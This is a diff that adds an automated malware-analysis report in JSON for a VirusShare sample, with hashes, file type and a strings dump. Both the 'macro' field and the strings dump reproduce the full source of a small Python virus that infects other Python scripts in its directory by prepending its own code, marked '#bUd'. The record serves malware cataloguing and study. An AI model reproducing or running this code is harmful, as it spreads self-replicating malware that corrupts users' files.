@@ -1,0 +1,63 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "open": "May open a file",
+            "write": "May write to a file"
+        },
+        "macro": "#!/usr/bin/python\n#bUd\nimport  os, sys\nfileList = []\ndir = './'\nfileList = os.listdir(dir)\nfor file in fileList:\n        try:\n                hdl=open(file, 'r+')\n                pyt=hdl.readline()\n                if pyt == '#!/usr/bin/python\\n':\n                        signature = hdl.readline()\n                        if signature != '#bUd\\n':\n                                hdl.seek(0,0)\n                                f=hdl.read()\n                                hdl2=open(sys.argv[0],'r')\n                                hdl.seek(0,0)\n                                a=0\n                                while a != 30:\n                                        f2=hdl2.readline()\n                                        hdl.write(f2)\n                                        a = a + 1\n                                hdl2.close()\n                                hdl.close()\n                                hdl=open(file, 'a')\n                                hdl.write(f)\n                hdl.close\n        except:\n                pass"
+    },
+    "filename": "VirusShare_a92d1688f10401a5e3fd9102ef3a91c4",
+    "filesize": 1038,
+    "filetype": "Python script, ASCII text executable",
+    "hashes": {
+        "md5": "a92d1688f10401a5e3fd9102ef3a91c4",
+        "sha1": "b9d597e1a7bde5230892ef3006fc2a278c6b4bd3",
+        "sha256": "2bc30c0965cf6c8655b76be8e629292b3aef1fbdaa5f17b659d1c9e5874568d9"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "#!/usr/bin/python",
+            "#bUd",
+            "import  os, sys",
+            "fileList = []",
+            "dir = './'",
+            "fileList = os.listdir(dir)",
+            "for file in fileList:",
+            "        try:",
+            "                hdl=open(file, 'r+')",
+            "                pyt=hdl.readline()",
+            "                if pyt == '#!/usr/bin/python\\n':",
+            "                        signature = hdl.readline()",
+            "                        if signature != '#bUd\\n':",
+            "                                hdl.seek(0,0)",
+            "                                f=hdl.read()",
+            "                                hdl2=open(sys.argv[0],'r')",
+            "                                hdl.seek(0,0)",
+            "                                a=0",
+            "                                while a != 30:",
+            "                                        f2=hdl2.readline()",
+            "                                        hdl.write(f2)",
+            "                                        a = a + 1",
+            "                                hdl2.close()",
+            "                                hdl.close()",
+            "                                hdl=open(file, 'a')",
+            "                                hdl.write(f)",
+            "                hdl.close",
+            "        except:",
+            "                pass"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.266079",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
